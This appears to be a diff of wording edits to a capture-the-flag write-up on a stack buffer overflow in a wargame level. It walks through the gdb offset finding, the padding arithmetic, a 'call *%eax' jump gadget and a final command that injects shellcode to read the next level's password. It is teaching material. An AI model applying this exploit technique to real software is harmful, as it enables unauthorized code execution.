@@ -16,7 +16,7 @@ int main(int argc, char **argv) {
 
 The problem is obvious:
 `strcpy` is well-known to be unsafe,
-it doesn't check if the destination array has enough space to store the source array.
+as it doesn't check if the destination array has enough space to store the source array.
 We can overwrite the memory area beyond `buf` using a long command line argument.
 
 If you recall from the previous challenge,
@@ -31,16 +31,15 @@ In the previous challenge we could jump to the insecure function `run`.
 In this program however,
 we don't have such easy target.
 On the other hand,
-we can bring insecure code inside through the input string.
-
+we can bring insecure code inside,
+using the input string.
 We could inject what is commonly called a *shellcode*:
 a small piece of binary code that executes `/bin/sh`.
 
 Implementing such shellcode is beyond the scope of this article.
-If you are interested,
-it is thoroughly explained in the Smash The Stack article[5],
-see the resources.
-Essentially it is a modified version of a simple C program like this:
+If you're interested,
+it's thoroughly explained in the Smash The Stack article[5].
+Essentially it's a modified version of a simple C program like this:
 ```
 #include <stdio.h>
 
@@ -53,9 +52,9 @@ void main() {
 }
 ```
 Writing shellcode is not easy.
-After compiling such program,
+After compiling the above program,
 there is more work to do,
-for example you may have to rewrite some of the assembly instructions to eliminate any NULL bytes,
+such as rewriting assembly instructions that use `NULL` values,
 as `strcpy` won't copy anything beyond the first `NULL`.
 
 For our purposes,
@@ -71,12 +70,12 @@ The content of the stack will look something like this when we are inside `fun`:
 0x0000      content of the local variable buf (1024 bytes)
 0x0400+?    the return address
 ```
-That is, the return address is somewhere soon after the end of `buf`.
+That is,
+the return address should be a few bytes after the end of `buf`.
 We can find the right position using `gdb`.
 When we overwrite the return address with something invalid,
 `gdb` will print the address it could not jump to.
 We can use this to guess the right location.
-
 We know that the size of `buf` is 1024,
 so let's run the program with a longer string:
 ```
@@ -98,7 +97,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x706f6e6d in ?? ()
 ```
 That looks within our `abc...` sequence.
-Let's check the ASCII codes to find the exact position:
+Let's check the ASCII codes to find the exact location:
 ```
 level03@box:/levels/level04$ echo abcdefghijklmnopqrstuvwxyz | hexdump -C
 00000000  61 62 63 64 65 66 67 68  69 6a 6b 6c 6d 6e 6f 70  |abcdefghijklmnop|
@@ -108,8 +107,8 @@ level03@box:/levels/level04$ echo abcdefghijklmnopqrstuvwxyz | hexdump -C
 Since `m=6d n=6e o=6f p=70`,
 the return address is in the place of the letters `mnop`.
 As there are 12 letters before "m",
-we can calculate the target length until the return address is 1024 + 12 = 1036.
-Let's verify this final number with one last test in `gdb`:
+we can calculate the target length is 1024 + 12 = 1036.
+Let's verify with one last test in `gdb`:
 ```
 (gdb) run $(python -c 'print "A" * 1036 + "BBBB"')
 Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1036 + "BBBB"')
@@ -123,24 +122,24 @@ then our input string will be in this form:
 ```
 SSSSSSSS PPPPPPPPPPPPPPPPPPPPPP AAAA
 ```
-Where `S`s indicate the shellcode,
-`P`s the padding, and `A`s the jump address.
-We calculated the length of `S + P` is 1036,
+Where `S` indicate the shellcode,
+`P` the padding, and `A` the jump address.
+We calculated the length of `S + P = 1036`,
 to know the length of `P` alone we must find the length of `S`:
 ```
 level03@box:/levels/level04$ printf $EGG | wc -c
 45
 ```
-Thus, the length of the padding should be 1036 - 45 = 991 characters.
+Thus, the length of the padding should be `1036 - 45 = 991` characters.
 
 The only thing missing is the jump address.
 We want to jump to the address of `buf`,
-but how can we cannot know that.
+but we cannot really know that.
 In the past,
 the stack used to be at the same address in all programs,
 which was easy to exploit.
-As of today,
-thanks to address space layout randomization (ASLR) used in modern operating systems,
+Today,
+thanks to *Address Space Layout Randomization (ASLR)* used in modern operating systems,
 the start address of the stack is randomized,
 making it extremely difficult to guess the right location.
 
@@ -161,8 +160,8 @@ level03@box:/levels/level04$ objdump -d level04 | grep call.*eax
  80484cf:   ff d0                   call   *%eax
  80485fb:   ff d0                   call   *%eax
 ```
-Thus,
-we can use either `0x080484cf` or `0x080485fb` as the address:
+Bingo!
+We can use either `0x080484cf` or `0x080485fb` as the address:
 ```
 level03@box:/levels/level04$ ./level04 $EGG$(python -c 'print "A" * 991')$(printf '\xcf\x84\x04\x08')
 /levels/level04 $ cat /home/level04/.password 
